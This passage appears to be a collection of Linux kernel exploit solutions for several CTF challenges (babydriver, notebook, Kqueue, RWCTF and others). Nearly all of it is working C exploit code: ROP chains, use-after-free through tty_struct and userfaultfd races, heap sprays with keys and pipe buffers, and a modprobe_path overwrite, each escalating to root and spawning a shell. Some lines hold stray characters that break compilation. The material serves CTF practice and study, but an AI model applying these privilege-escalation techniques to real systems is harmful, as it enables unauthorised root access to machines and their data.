#define IRETQ 0xffffffff81050ac2
#define SYSRETQ 0xffffffff81a00148

size_t commit_creds = NULL, prepare_kernel_cred = NULL;

size_t user_cs, user_ss, user_rflags, user_sp;
void saveStatus()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("[*] Status has been saved. \n");
}

void getRoot(){
    void *(*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    commit_creds_ptr(prepare_kernel_cred_ptr(NULL));
}

void read_core(int fd, char *buf){
    ioctl(fd, 0x6677889B, buf);
}

void setoff_core(int fd, size_t offest){
    ioctl(fd, 0x6677889C, offest);
}

void copy_core(int fd, size_t size){
    ioctl(fd, 0x6677889A, size);
}

void getshell(){
    if(getuid()){
        printf("[x] Failed to get the root!\n");
        exit(-1);
    }
    system("/bin/sh");
}


int main(){
    saveStatus();

    int fd = open("/proc/core", 2);
    if(fd < 0){
        printf("[x] Failed to open core\n");
        exit(-1);
    }

    FILE *sym_table_fd = fopen("/tmp/kallsyms", "r");
    if(sym_table_fd < 0){
        printf("[x] Failed to open sym_table\n");
        exit(-1);
    }

    size_t addr;
    char sym_name[0x40];
    char sym_type[0x10];
    while(fscanf(sym_table_fd, "%llx%s%s", &addr, &sym_type, &sym_name))
    {
        if(commit_creds && prepare_kernel_cred){
            break;
        }
        if(!strcmp("commit_creds", sym_name)){
            commit_creds = addr;
            printf("[+] Successful to get the addr of commit_cread: %llx \n", commit_creds);
            continue;
        }
        if(!strcmp("prepare_kernel_cred", sym_name)){
            prepare_kernel_cred = addr;
            printf("[+] Successful to get the addr of prepare_kernel_cred : %llx \n", prepare_kernel_cred);
            continue;
        }
    }
    
    char buf[0x40];
    setoff_core(fd, 64);
    read_core(fd, buf);
    size_t canary = ((size_t*)(buf))[0];
    size_t offset = commit_creds - 0xffffffff8109c8e0;
    size_t rop[0x40], i = 0;
    for(;i < 10; ++i)
        rop[i] = canary;
    rop[i++] = (size_t)getRoot;
    rop[i++] = SWAPGS_POPFQ_RET + offset;
    rop[i++] = 0;
    rop[i++] = IRETQ + offset;
    rop[i++] = (size_t)getshell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(fd, rop, 0x800);
    copy_core(fd, 0xffffffffffff0000 | (0x100));
}
```





##### CISCN-2017-babydriver





```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>
char buf[0x30];
int main(){
    int fd1 = open("/dev/babydev", 2);
    int fd2 = open("/dev/babydev", 2);
    ioctl(fd1, 0x10001, 192);
    close(fd1);
    pid_t pid = fork();

    if(pid < 0){
        printf("fork fail\n");
        exit(-1);
    }
    if(pid == 0){
        write(fd2, buf, 0x30);
        if(getuid() == 0){
            system("/bin/sh");
        }
    }
    else{
        wait(NULL);
    }
    
}
```





```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>

size_t commit_creds = 0xffffffff810a1420;
size_t prepare_kernel_cred = 0xffffffff810a1810;
size_t init_cred = 0xffffffff81e48c60;
size_t mov_cr4_rdi_pop_rbp_ret = 0xffffffff81004d80;
size_t pop_rdi_ret = 0xffffffff810d238d;
size_t swapgs_pop_rbp_ret = 0xffffffff81063694;
size_t iretq_ret = 0xffffffff814e35ef;
size_t mov_rsp_rax_dec_ebx_ret = 0xffffffff8181bfc5;
size_t pop_rax_ret = 0xffffffff8100ce6e;

size_t user_cs, user_ss, user_rflags, user_sp;
void saveStatus()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("[*] Status has been saved. \n");
}

void getRoot(){
    void *(*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    commit_creds_ptr(prepare_kernel_cred_ptr(NULL));
}

void getShell(){
    if(getuid()){
        printf("[x] Failed to get the root!\n");
        exit(-1);
    }
    system("/bin/sh");
}

char buf[0x30];
int main(){
    saveStatus();
    int fd1 = open("/dev/babydev", 2);
    int fd2 = open("/dev/babydev", 2);
    ioctl(fd1, 0x10001, 0x2e0);
    close(fd1);

    size_t rop[0x10], i = 0;
    rop[i++] = pop_rdi_ret;
    rop[i++] = 0x6f0;
    rop[i++] = mov_cr4_rdi_pop_rbp_ret;
    rop[i++] = 0;
    rop[i++] = (size_t)getRoot;
    rop[i++] = swapgs_pop_rbp_ret;
    rop[i++] = 0;
    rop[i++] = iretq_ret;
    rop[i++] = (size_t)getShell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    size_t fake_op[0x10], fake_tty[0x10];
    fake_op[0] = pop_rax_ret;
    fake_op[1] = rop;
    fake_op[2] = mov_rsp_rax_dec_ebx_ret;
    fake_op[7] = mov_rsp_rax_dec_ebx_ret;

    char buf[0x10] = {0};
    int fd3 = open("/dev/ptmx", 2);
    
    if(fd3 < 0){
        printf("[x] fail open ptmx\n");
    }

    read(fd2, fake_tty, 0x20);
    fake_tty[3] = fake_op;
    write(fd2, fake_tty, 0x20);c

    write(fd3, buf, 0x10);
    
}
```





##### 0CTF2018 Final - baby kernel

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <pthread.h>

char buf[0x101];
void *real_addr;
int competetion_times = 0x100, status = 1;
pthread_t competetion_thread;

struct flag
{
    char *flag_addr;
    int flag_len;
}flag = {.flag_addr = &buf, .flag_len = 33};



void * competetionThread(void)
{
    while(status){
        for (int i = 0; i < competetion_times; i++)
        flag.flag_addr = real_addr;
    }
    
}

int main(){
    int fd = open("/dev/baby", 2);
    if(fd < 0){
        printf("Open dev fail!\n");
        exit(-1);
    }
    ioctl(fd, 0x6666);

    system("dmesg | grep flag > /tmp/record.txt");
    int fd_addr = open("/tmp/record.txt", 2);
    if(fd_addr < 0){
        printf("Open txt fail!\n");
        exit(-1);
    }
    read(fd_addr, buf, 0x100);
    char *flag_addr_addr = strstr(buf, "Your flag is at ") + strlen("Your flag is at ");
    real_addr = strtoull(flag_addr_addr, flag_addr_addr + 16, 16);
    printf("flag_addr_is %p\n", real_addr);

    
    pthread_create(&competetion_thread, NULL, competetionThread, NULL);
    while(status){
        for (int i = 0; i < competetion_times; i++){
            flag.flag_addr = &buf;
            ioctl(fd, 0x1337, &flag);
        }
        system("dmesg | grep flag > /tmp/record.txt");
        int fd_flag = open("/tmp/record.txt", 2);
        read(fd_flag, buf, 0x100);
        if (strstr(buf, "flag{"))c
            status = 0;
    }
    pthread_cancel(competetion_thread);
    system("dmesg | grep flag");
}
```





##### 强网杯2021线上赛 - notebook



```c
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <linux/userfaultfd.h>
#include <signal.h>
#include <sys/syscall.h>
#include <poll.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sched.h>
#include <semaphore.h>

size_t prepare_kernel_cred = 0xffffffff810a9ef0;
size_t commit_creds = 0xffffffff810a9b40;
size_t init_cred = 0xffffffff8225c940;
size_t work_for_cpu_fn = 0xffffffff8109eb90;
size_t ptm_unix98_ops = 0xffffffff81e8e440;
size_t pty_unix98_ops = 0xffffffff81e8e320;

int fd_note;
char *uffd_buf;
sem_t edit_sem, add_sem;
char buf[0x100];

struct note
{
    char *buf;
    size_t size;
};

struct userarg
{
    size_t idx;
    size_t size;
    char *buf;
};

size_t user_cs, user_ss, user_rflags, user_sp;
void saveStatus()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("[*] Status has been saved. \n");
}

static pthread_t monitor_thread;

void errExit(char * msg)
{
    printf("[x] Error at: %s\n", msg);
    exit(EXIT_FAILURE);
}

void registerUserFaultFd(pthread_t *monitor_thread, void * addr, unsigned long len, void (*handler)(void*))
{
    long uffd;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        errExit("userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        errExit("ioctl-UFFDIO_API");

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        errExit("ioctl-UFFDIO_REGISTER");

    s = pthread_create(&monitor_thread, NULL, handler, (void *) uffd);
    if (s != 0)
        errExit("pthread_create");
}

char temp_page_for_stuck[0x1000];
void *uffdHandlerForStuckingThread(void *args)
{
    struct uffd_msg msg;
    int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) args;

    for (;;) 
    {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1)
            errExit("poll");

        nread = read(uffd, &msg, sizeof(msg));

        sleep(100000000);

        if (nread == 0)
            errExit("EOF on userfaultfd!\n");

        if (nread == -1)
            errExit("read");

        if (msg.event != UFFD_EVENT_PAGEFAULT)
            errExit("Unexpected event on userfaultfd\n");

        uffdio_copy.src = (unsigned long long) temp_page_for_stuck;
        uffdio_copy.dst = (unsigned long long) msg.arg.pagefault.address &
                                                    ~(0x1000 - 1);
        uffdio_copy.len = 0x1000;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            errExit("ioctl-UFFDIO_COPY");

        return NULL;
    }
}

void getShell(){
    if(getuid()){
        printf("[x] Failed to get the root!\n");
        exit(-1);
    }
    system("/bin/sh");
}

void bindCore(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("[*] Process binded to core %d\n", core);
}

void noteAdd(int idx, int size, char *buf){
    struct userarg a = {idx, size, buf};
    ioctl(fd_note, 0x100, &a);
}

void noteEdit(int idx, int size, char *buf){
    struct userarg a = {idx, size, buf};
    ioctl(fd_note, 0x300, &a);
}

void noteDel(int idx){
    struct userarg a;
    a.idx = idx;
    ioctl(fd_note, 0x200, &a);
}

void noteGift(char *buf){
    struct userarg a;
    a.buf = buf;
    ioctl(fd_note, 0x64, &a);
}

void *addSize(void *args){
    sem_wait(&add_sem);
    noteAdd(0, 0x60, uffd_buf);
}

void *editUaf(void *args){
    sem_wait(&edit_sem);
    noteEdit(0, 0, uffd_buf);
}

int main(){
    struct note kernel_note[0x10];
    size_t fake_tty_ops[0x100];
    pthread_t uffd_monitor_thread, add_fix_size_thread, edit_uaf_thread;
    size_t fake_tty_struct_data[0x100], tty_ops, orig_tty_struct_data[0x100];
    size_t tty_struct_addr, fake_tty_ops_addr;
    int tty_fd;

    saveStatus();
    bindCore(0);
    
    sem_init(&edit_sem, 0, 0);
    sem_init(&add_sem, 0, 0);

    fd_note = open("/dev/notebook", 2);
    if(fd_note < 0){
        printf("Open dev fail!\n");
        exit(-1);
    }

    uffd_buf = (char*)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    registerUserFaultFd(&uffd_monitor_thread, uffd_buf, 0x1000 ,uffdHandlerForStuckingThread);

    noteAdd(0, 0x20, buf);
    noteEdit(0, 0x2e0, buf);

    pthread_create(&edit_uaf_thread, NULL, editUaf, NULL);
    pthread_create(&add_fix_size_thread, NULL, addSize, NULL);

    sem_post(&edit_sem);
    sleep(1);
    sem_post(&add_sem);
    sleep(1);


    int fd_ptmx = open("/dev/ptmx", 2);
    if(fd_ptmx < 0){
        printf("[x] fail open ptmx\n");
        exit(-1);
    }

    read(fd_note, orig_tty_struct_data, 0);
    //tty_ops = ((size_t*)buf)[3];
    tty_ops = orig_tty_struct_data[3];
    size_t offset = ((tty_ops & 0xfff) == (ptm_unix98_ops & 0xfff)) ? 
                                (tty_ops - ptm_unix98_ops) : (tty_ops - pty_unix98_ops);
    
    noteAdd(1, 0x20, buf);
    noteEdit(1, 0x200, buf);
    fake_tty_ops[12] = work_for_cpu_fn + offset;
    write(fd_note, fake_tty_ops , 1);

    noteGift(kernel_note);
    tty_struct_addr = kernel_note[0].buf;
    fake_tty_ops_addr = kernel_note[1].buf;
    printf("%lx\n", tty_struct_addr);
    printf("%lx\n", fake_tty_ops_addr);

    memcpy(fake_tty_struct_data, orig_tty_struct_data, 0x60);
    fake_tty_struct_data[3] = fake_tty_ops_addr;
    fake_tty_struct_data[4] = prepare_kernel_cred + offset;
    fake_tty_struct_data[5] = NULL;
    write(fd_note, fake_tty_struct_data, 0);

    ioctl(fd_ptmx, 0, 0);
    
    read(fd_note, fake_tty_struct_data, 0);
    fake_tty_struct_data[4] = commit_creds + offset;
    fake_tty_struct_data[5] = fake_tty_struct_data[6];
    fake_tty_struct_data[6] = orig_tty_struct_data[6];
    write(fd_note, fake_tty_struct_data, 0);

    ioctl(fd_ptmx, 0, 0);

    write(fd_note, orig_tty_struct_data, 0);
    getShell();
    return 0;
}
```





##### RWCTF2023体验赛 - Digging into kernel 3



```c
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <sys/syscall.h>
#include <linux/keyctl.h>

size_t kernel_base = 0xffffffff81000000;
size_t commit_creds = 0xffffffff81095c30;
size_t prepare_kernel_cred = 0xffffffff81096110;
size_t init_cred = 0xffffffff82850580;
size_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81e00ed0;
size_t user_free_payload_rcu = 0xffffffff813d8210;

size_t pop_rdi_ret = 0xffffffff8106ab4d;
size_t xchg_rdi_rax_ret = 0xffffffff81adfc70;
size_t push_rsi_pop_rsp_pop_rbx_pop_rbp_pop_r12_ret = 0xffffffff81250c9d;
size_t pop_rbx_pop_rbp_pop_r12_ret = 0xffffffff81250ca4;


struct node
{
    unsigned int idx;
    unsigned int size;
    char *buf;
};

int fd;

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("[*] Status has been saved. \n");
}

void get_shell(){
    if(getuid()){
        printf("[x] Failed to get the root!\n");
        exit(-1);
    }
    system("/bin/sh");
}

void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("[*] Process binded to core %d\n", core);
}

int key_alloc(char *description, char *payload, size_t plen)
{
    return syscall(__NR_add_key, "user", description, payload, plen, 
                   KEY_SPEC_PROCESS_KEYRING);
}

int key_read(int keyid, char *buffer, size_t buflen)
{
    return syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);
}

int key_revoke(int keyid)
{
    return syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, 0, 0, 0);
}


void alloc(int idx, int size, char *buf){
    struct node a = {idx, size, buf};
    ioctl(fd, 0xDEADBEEF, &a);
    
}

void del(int idx){
    struct node a;
    a.idx = idx;
    ioctl(fd, 0xC0DECAFE, &a);
}

int main(){
    size_t *buf, pipe_buffer_addr;
    int key_id[40], victim_key_idx = -1, pipe_key_id;
    char desciption[0x100];
    int pipe_fd[2];
    int retval;

    save_status();
    bind_core(0);
    fd = open("/dev/rwctf", 2);
    if(fd < 0){
        printf("[x] Open dev fail!\n");
        exit(-1);
    }
    
    buf = malloc(sizeof(size_t) * 0x2000);
    for(int i = 0; i < 15; i++)
        alloc(0, 0xc0, buf);
    del(0);
    for(int i = 0; i < 40; i++){
        snprintf(desciption, 0x100, "%s%d", "a", i);
        key_id[i] = key_alloc(desciption, buf, 0xc0 - 0x18);
        if(key_id[i] < 0){
            printf("[x] failed to alloc %d key!\n", i);
            exit(-1);
        }
    }

    del(0);

    buf[0] = 0;
    buf[1] = 0;
    buf[2] = 0x2000;
    for(int i = 0; i < 80; i++){
        alloc(0, 0xc0, buf);
    }

    for(int i = 0; i < 40; i++){
        if(key_read(key_id[i], buf, 0x2000) > 0xc0) {
            printf("[+] found victim key at idx: %d\n", i);
            victim_key_idx = i;
        } 
        else{
            key_revoke(key_id[i]);
        }
    }
    if(victim_key_idx == -1){
        printf("[x] fail to read user_key_payload\n");
        exit(-1);
    }

    size_t kernel_offset = -1;
    for (int i = 0; i < 0x2000 / 8; i++) {
        if (buf[i] > kernel_base && (buf[i] & 0xfff) == 0x210) {
            kernel_offset = buf[i] - user_free_payload_rcu;
            break;
        }
    }
    if(kernel_offset == -1){
        printf("[x] fail to leak offest\n");
        exit(-1);
    }
    else{
        printf("kernel_offset_is: %lx\n", kernel_offset);
    }

    alloc(0, 0xc0, buf);
    alloc(1, 0xc0, buf);
    del(1);
    del(0);
    pipe_key_id = key_alloc("aaaa", buf, 0xc0 - 0x18);
    del(1);

    alloc(0, 0x400, buf);
    del(0);
    pipe(pipe_fd);
    retval = key_read(pipe_key_id, buf, 0xffff);
    pipe_buffer_addr = buf[16]; /* pipe_inode_info->bufs */
    printf("[+] Got pipe_buffer: %lx\n", pipe_buffer_addr);

    int i = 0;
    buf[i++] = 0;
    buf[i++] = 0;
    buf[i++] = pipe_buffer_addr + 0x18;
    buf[i++] = pop_rbx_pop_rbp_pop_r12_ret + kernel_offset;
    buf[i++] = push_rsi_pop_rsp_pop_rbx_pop_rbp_pop_r12_ret + kernel_offset;
    buf[i++] = 0;
    buf[i++] = 0;
    buf[i++] = pop_rdi_ret + kernel_offset;
    buf[i++] = init_cred + kernel_offset;
    //buf[i++] = prepare_kernel_cred + kernel_offset;
    //buf[i++] = xchg_rdi_rax_ret + kernel_offset;
    buf[i++] = commit_creds + kernel_offset;
    buf[i++] = swapgs_restore_regs_and_return_to_usermode + kernel_offset + 0x31;
    buf[i++] = 0;
    buf[i++] = 0;
    buf[i++] = get_shell;
    buf[i++] = user_cs;
    buf[i++] = user_rflags;
    buf[i++] = user_sp;
    buf[i++] = user_ss;

    del(0);
    alloc(0, 0x400, buf);
    close(pipe_fd[1]);
    close(pipe_fd[0]);
    return 0;
}
```









##### RWCTF2022高校赛 - Digging into kernel 1 & 2

```python
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <sys/syscall.h>

#define ROOT_SCRIPT_PATH  "/home/getshell"
char root_cmd[] = "#!/bin/sh\nchmod 777 /flag";

size_t commit_creds = 0xffffffff8108a660;
size_t prepare_kernel_cred = 0xffffffff8108a9a0;
size_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81c00a2f;
size_t secondary_startup_64 = 0xffffffff81000030;
size_t modprobe_path = 0xffffffff82444700;

struct node
{
    size_t *str;
    unsigned int offset;
    unsigned int size;
};

size_t buf[0x20];
char flag[0x20];


void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("[*] Process binded to core %d\n", core);
}

void create(int fd){
    struct node a = {0, 0, 0};
    ioctl(fd, 0x1111111, &a);
}

void send_data(int fd, int size, int offset, size_t *s){
    struct node a = {s, offset, size};
    ioctl(fd, 0x6666666, &a);
}

void recv_data(int fd, int size, int offset, size_t *s){
    struct node a = {s, offset, size};
    ioctl(fd, 0x7777777, &a);
}

int main(){
    
    int fd[5], root_script_fd, flag_fd;
    
    size_t heap_leak, heap_base, kerenl_offset;
    bind_core(0);
    for(int i = 0; i < 5; ++i){
        fd[i] = open("/dev/xkmod", 0);
        if(fd[i] < 0){
            printf("[x] Failed to open %d\n", i);
            exit(-1);
        }
    }
    
    root_script_fd = open(ROOT_SCRIPT_PATH, O_RDWR | O_CREAT);
    write(root_script_fd, root_cmd, sizeof(root_cmd));
    close(root_script_fd);
    system("chmod +x " ROOT_SCRIPT_PATH);

    create(fd[0]);
    recv_data(fd[0], 0x50, 0, buf);
    heap_leak = buf[0];
    printf("heap_leak_is 0x%lx\n", heap_leak);
    heap_base = heap_leak & 0xfffffffff0000000;
    buf[0] = heap_base + 0x9d000 - 0x10;
    close(fd[0]);

    send_data(fd[1], 0x20, 0, buf);
    create(fd[1]);
    create(fd[2]);
    recv_data(fd[2], 0x50, 0, buf);  

    if((buf[2] & 0xfff) == 0x30){
        kerenl_offset = buf[2] - secondary_startup_64;
        printf("kernel_offset_is %lx\n", kerenl_offset);
    }
    else{
        printf("leak kerenl_offset fail!\n");
        exit(-1);
    }

    create(fd[2]);
    close(fd[2]);
    buf[0] = modprobe_path + kerenl_offset - 0x10;
    send_data(fd[3], 0x20, 0, buf);
    create(fd[3]);
    create(fd[4]);
    memset(buf, 0, 0x20);
    strcpy((char *)&buf[2], ROOT_SCRIPT_PATH);
    send_data(fd[4], 0x20, 0, buf);
    
    system("echo -e '\\xff\\xff\\xff\\xff' > /home/fake");
    system("chmod +x /home/fake");
    system("/home/fake");
/*
    memset(flag, 0, sizeof(flag));
    
    flag_fd = open("/flag", O_RDWR);
    if (flag_fd < 0) {
        printf("Failed to open flag");
        exit(-1);
    }

    read(flag_fd, flag, sizeof(flag));
    printf("Got flag: %s\n", flag);
    */
    return 0;
}
```





##### InCTF2021 - Kqueue

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <sys/syscall.h>
#include <stdint.h>

typedef struct{
    uint32_t max_entries;
    uint16_t data_size;
    uint16_t entry_idx;
    uint16_t queue_idx;
    char* data;
}request_t;


int dev_fd;
size_t buf[0x20];

size_t root_rip;
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("[*] Status has been saved. \n");
}


void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("[*] Process binded to core %d\n", core);
}

void getshell(){
    if(getuid()){
        printf("[x] Failed to get the root!\n");
        exit(-1);
    }
    system("/bin/sh");
    exit(0);
}

void create_kqueue(uint32_t max_entrie, uint16_t data_size){
    request_t a = {
        .max_entries = max_entrie, 
        .data_size = data_size
    };
    ioctl(dev_fd, 0xDEADC0DE, &a);
}

void delete_kqueue(uint16_t queue_idx){
    request_t a = {.queue_idx = queue_idx};
    ioctl(dev_fd, 0xBADDCAFE, &a);
}

void save_kqueue_entries(uint16_t entry_idx,  uint16_t queue_idx, uint16_t data_size){
    request_t a = {.entry_idx = entry_idx, .data_size = data_size, .queue_idx = queue_idx};
    ioctl(dev_fd, 0xB105BABE, &a);
}

void edit_kqueue(uint16_t queue_idx, uint16_t entry_idx, char *data){
    request_t a = {.queue_idx = queue_idx, .entry_idx = entry_idx, .data = data};
    ioctl(dev_fd, 0xDAADEEEE, &a);
}

void shellcode(void)
{
    __asm__(
        "mov r12, [rsp + 0x8];"
        "sub r12, 0x201179;"
        "mov r13, r12;"
        "add r12, 0x8c580;"  // prepare_kernel_cred
        "add r13, 0x8c140;"  // commit_creds
        "xor rdi, rdi;"
        "call r12;"
        "mov rdi, rax;"
        "call r13;"
        "swapgs;"
        "mov r14, user_ss;"
        "push r14;"
        "mov r14, user_sp;"
        "push r14;"
        "mov r14, user_rflags;"
        "push r14;"
        "mov r14, user_cs;"
        "push r14;"
        "mov r14, root_rip;"
        "push r14;"
        "iretq;"
    );
}

int main(){
    int seq_fd[0x200];
    root_rip = (size_t)getshell;
    save_status();
    bind_core(0);

    dev_fd = open("/dev/kqueue", 2);
    if(dev_fd < 0){
        printf("Failed to open!\n");
        exit(-1);
    }
    create_kqueue(0xffffffff, 0x100);
    
    for(int i = 0; i < 20; ++i)
        buf[i] = (size_t)shellcode;

    edit_kqueue(0, 0, buf);
    for (int i = 0; i < 0x200; i++){
        seq_fd[i] = open("/proc/self/stat", 0);
        if(seq_fd[i] < 0){
            printf("Failed to open!\n");
            exit(-1);
        }
    }
    save_kqueue_entries(0, 0, 0x40);
    for (int i = 0; i < 0x200; i++)
        read(seq_fd[i], buf, 1);
    return 0;

}
```



##### pwnhub 3月公开赛

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <signal.h>

size_t commit_creds = 0xffffffff810ce710;
size_t prepare_kernel_cred = 0xffffffff810cebf0;
size_t init_cred = 0xffffffff82c6b920;
size_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81c00fb0;

size_t add_rsp_0x1a8_ret = 0xffffffff817d1e76;
size_t pop_rdi_ret = 0xffffffff8102517a;
size_t kernel_offset;

struct info
{
    size_t idx;
    void *buf;
};

int kheap_fd, seq_fd;
size_t buf[0x10];


size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("[*] Status has been saved. \n");
}

void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("[*] Process binded to core %d\n", core);
}

void get_shell(){
    if(getuid()){
        printf("[x] Failed to get the root!\n");
        exit(-1);
    }
    system("/bin/sh");
    exit(0);
}

void add(size_t idx){
    struct info a;
    a.idx = idx;
    ioctl(kheap_fd, 0x10000, &a);
}

void del(size_t idx){
    struct info a;
    a.idx = idx;
    ioctl(kheap_fd, 0x10001, &a);
}

void mov(size_t idx){
    struct info a;
    a.idx = idx;
    ioctl(kheap_fd, 0x10002, &a);
}

void gift(size_t idx , void *buf){
    struct info a = {idx, buf};
    ioctl(kheap_fd, 0x6666, &a);
}

int main(){
    save_status();
    bind_core(0);
    
    kheap_fd = open("/dev/kheap", 2);
    if(kheap_fd < 0){
        printf("Failed to open!\n");
        exit(-1);
    }

    add(0);
    mov(0);
    del(0);

    seq_fd = open("/proc/self/stat", 0);
    if(seq_fd < 0){
        printf("Failed to open!\n");
        exit(-1);
    }

    read(kheap_fd, buf, 0x20);
    printf("leak_addr_is 0x%lx\n", buf[0]);
    kernel_offset = buf[0] - 0xffffffff8133f980;
    printf("kernel_offset_is 0x%lx\n", kernel_offset);
    buf[0] = add_rsp_0x1a8_ret + kernel_offset;
    
    write(kheap_fd, buf, 8);

    pop_rdi_ret += kernel_offset;
    init_cred += kernel_offset;
    commit_creds += kernel_offset;
    swapgs_restore_regs_and_return_to_usermode = swapgs_restore_regs_and_return_to_usermode + 10 + kernel_offset;

    __asm__(
    "mov r15,  0;"
    "mov r14,  0;"
    "mov r13,  pop_rdi_ret;"
    "mov r12,  init_cred;"
    "mov rbp,  commit_creds;"
    "mov rbx,  swapgs_restore_regs_and_return_to_usermode;"
    "xor rax,  rax;"
    "mov rdx,  8;"
    "mov rsi,  rsp;"
    "mov rdi,  seq_fd;"
    "syscall"
    );

    system("/bin/sh");
    exit(0);

}
```





##### CATCTF2022 kernel

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>

size_t commit_creds = 0xffffffff810ccc30;
size_t prepare_kernel_cred = 0xffffffff810cd0a0;
size_t init_cred = 0xffffffff82a63880;
size_t secondary_startup_64 = 0xffffffff81000030;
size_t modprobe_path = 0xffffffff82a64180;
size_t kernel_offset;

size_t iretq = 0xffffffff8103b82b;
size_t swapgs_pop_rbp_ret = 0xffffffff8107a4d4;

int dev_fd;
size_t buf[0x10];
size_t rop[0x20];

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("[*] Status has been saved. \n");
}

void get_root(){

    void *(*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred + kernel_offset;
    int (*commit_creds_ptr)(void *) = commit_creds + kernel_offset;
    commit_creds_ptr(prepare_kernel_cred_ptr(NULL));
}

void get_shell(){
    if(getuid()){
        printf("[x] Failed to get the root!\n");
        exit(-1);
    }
    system("/bin/sh");
    exit(0);
}


int main(){
    save_status();

    dev_fd = open("/dev/test", 2);
    if(dev_fd < 0){
        puts("Failed to open dev!");
        exit(-1);
    }

    read(dev_fd, buf, 64);
    size_t canary = buf[0];
    printf("leak_canary_is %lx\n", canary);

